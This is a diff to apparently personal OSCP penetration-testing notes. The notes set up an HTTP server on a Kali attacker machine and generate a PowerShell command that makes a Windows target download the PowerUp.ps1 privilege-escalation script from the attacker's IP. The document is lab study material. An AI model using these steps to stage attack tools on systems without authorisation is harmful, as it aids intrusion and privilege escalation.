@@ -2,14 +2,14 @@
 
 On KALI ATTACKER
 ```
-cd ~/Desktop/Tools/Windows && python -m http.server 80
+python -m http.server 80 --directory ~/Desktop/Tools/Windows
 ```
 
 # Step 2 : On WINDOWS TARGET: Powershell (MODIFY OUTFILE DESTINATION)
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `powershell wget http://${KaliIP}/PowerUp.ps1 -OutFile C:\\\Users\\\mike\\\Desktop\\\PowerUp.ps1`;
+const command = `powershell wget http://${KaliIP}/PowerUp.ps1 -OutFile PowerUp.ps1`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
